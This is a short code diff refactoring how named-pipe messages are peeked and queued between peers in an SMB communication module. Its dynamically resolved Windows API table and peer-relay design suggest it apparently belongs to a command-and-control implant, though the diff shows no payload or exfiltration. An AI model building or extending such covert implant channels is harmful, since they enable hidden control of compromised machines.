@@ -379,7 +379,7 @@ namespace Smb {
         return true;
     }
 
-    BOOL PeekClientMessage(HANDLE handle, _stream &stream, int32_t &offset) {
+    BOOL PeekClientMessage(HANDLE handle, _stream &stream) {
         HEXANE
 
         _stream search  = { };
@@ -398,7 +398,6 @@ namespace Smb {
                 Ctx->win32.SetFilePointer(handle, current, nullptr, FILE_BEGIN);
             } else {
                 x_memcpy(&stream , &search, 0x10);
-                x_memcpy(&offset , &current, sizeof(int32_t));
                 return true;
             }
 
@@ -419,6 +418,7 @@ namespace Smb {
 
         while (peer) {
             if (peer->ingress_name) {
+                _stream search = { };
 
                 if (!peer->ingress_handle) {
                     SmbContextInit(&smb_attr, &sec_attr);
@@ -432,10 +432,7 @@ namespace Smb {
                     }
                 }
 
-                _stream search = { };
-                int32_t offset = 0;
-
-                while (PeekClientMessage(peer->ingress_handle, search, offset)) {
+                while (PeekClientMessage(peer->ingress_handle, search)) {
                     auto queue = R_CAST(_stream*, x_malloc(sizeof(_stream)));
 
                     x_memcpy(&queue->peer_id     , &search.peer_id, sizeof(uint32_t));
@@ -444,7 +441,6 @@ namespace Smb {
                     x_memcpy(&queue->length      , &search.length, sizeof(uint32_t));
                     x_memset(&search             , 0, sizeof(_stream));
 
-                    Ctx->win32.SetFilePointer(peer->ingress_handle, offset, nullptr, FILE_BEGIN);
                     queue->buffer = B_PTR(x_malloc(queue->length));
 
                     if (!PipeRead(peer->ingress_handle, queue)) {
